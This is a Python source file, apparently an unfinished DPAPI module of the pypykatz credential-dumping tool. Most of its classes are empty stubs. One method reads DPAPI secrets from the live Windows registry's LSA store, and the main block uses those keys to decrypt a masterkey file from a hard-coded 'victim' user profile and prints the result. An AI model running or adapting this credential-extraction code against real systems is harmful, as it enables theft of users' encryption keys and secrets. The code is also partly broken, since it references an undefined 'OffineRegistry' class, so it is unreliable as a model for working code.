import os

from pypykatz import logger
from pypykatz.dpapi.structures.masterkeyfile import MasterKeyFile

class DPAPIUserKey:
	def __init__(self):
		self.dunno = None
	
	def from_registry(self):
		pass
		
	def from_password(self):
		pass
		
	def from_lsa(self):
		pass
		
class DPAPIMachineKey:
	def __init__(self):
		self.dunno = None
	
	def from_registry(self):
		pass
		
	def from_password(self):
		pass
		
	def from_lsa(self):
		pass
	

class DPAPI:
	def __init__(self):
		self.user_key = None
		self.machine_key = None
	
	@staticmethod
	def list_masterkeys():
		#logger.debug('Searching for MasterKey files...')
		#appdata = os.environ.get('APPDATA')
		#'%APPDATA%\Microsoft\Protect\%SID%'
		#'%SYSTEMDIR%\Microsoft\Protect'
		# TODO: implement this
		pass
	
	def get_keys_form_registry_live(self):
		from pypykatz.registry.live_parser import LiveRegistry
		from pypykatz.registry.security.common import LSASecretDPAPI
		lr = None
		try:
			lr = LiveRegistry.go_live()
		except Exception as e:
			logger.debug('Failed to obtain registry secrets via direct registry reading method')
			try:
				lr = OffineRegistry.from_live_system()
			except Exception as e:
				logger.debug('Failed to obtain registry secrets via filedump method')
		
		if lr is not None:
			for secret in lr.security.cached_secrets:
				if isinstance(secret, LSASecretDPAPI):
					print('Found DPAPI key in registry!')
					self.user_key = secret.user_key
					self.machine_key = secret.machine_key
					return	
			
		else:
			raise Exception('Registry parsing failed!')
	
	def decrypt_masterkey(self, data):
		mkf = MasterKeyFile.from_bytes(data)
		
		if mkf.masterkey is not None:
			dec_key = mkf.masterkey.decrypt(self.user_key)
			print(dec_key)
	
	
	
if __name__ == '__main__':
	filename = 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3448413973-1765323015-1500960949-1105\\4c9764dc-aa99-436c-bb30-ff39b3dd407c'
	dpapi = DPAPI()
	dpapi.get_keys_form_registry_live()
	with open(filename, 'rb') as f:
		dpapi.decrypt_masterkey(f.read())